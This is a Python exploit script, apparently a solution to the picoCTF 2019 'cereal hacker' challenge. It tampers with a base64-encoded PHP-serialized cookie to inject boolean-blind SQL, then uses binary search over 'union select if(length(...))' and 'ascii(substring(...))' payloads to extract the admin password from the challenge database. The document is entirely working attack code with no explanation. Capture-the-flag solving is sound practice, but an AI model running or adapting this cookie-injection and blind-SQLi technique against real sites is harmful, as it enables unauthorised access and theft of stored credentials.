import requests, re
from phpserialize import *
import base64

chal = '32256' # port of cereal hacker 1 chal.

url2 = "http://2019shell1.picoctf.com:{}/index.php?file=admin".format(chal)

s = requests.Session()

a = "TzoxMToicGVybWlzc2lvbnMiOjE6e3M6ODoidXNlcm5hbWUiO3M6MTk6Imd1ZXN0JyBhbmQgMT0xIC0tIC0iO30="
b = a.decode('base64')
c = loads(b, object_hook=phpobject)

def check(payload):
	c.username = payload
	d = dumps(c)
	e = base64.urlsafe_b64encode(d)
	cookies = {'user_info': e}
	r2 = s.get(url2, cookies=cookies)
	t2 = re.findall(r'<h5 class="card-title text-center">(.+?)</h5>',r2.text)[0]
	if t2 == 'Welcome to the admin page!':
		return True
	return False

def brute_length(p):
	s = 1
	e = 10000
	mid = (s+e) // 2
	while True:
		if check("admin' union select if(length(({})) > {},'admin',1) limit 1 offset 1-- -".format(p,mid)):
			s = mid +1
		else:
			e = mid
		mid = (s+e) // 2
		if (s==e):
			break
	print("length: {}".format(s))
	return s

def brute_char(p, i):
	s = 32
	e = 126
	mid = (s+e) // 2
	while True:
		if check("admin' union select if(ascii(substring({},{},1)) > {},'admin',1) limit 1 offset 1-- -".format(p,i,mid)):
			s = mid +1
		else:
			e = mid
		mid = (s+e) // 2
		if (s==e):
			break
	return chr(s)

def brute(p):
	length = brute_length(p)
	password = ""
	for i in range(len(password)+1,length+1):
		password += brute_char(p, i)
		print(password)

p = "(select password from pico_ch2.users where username='admin')"
brute(p)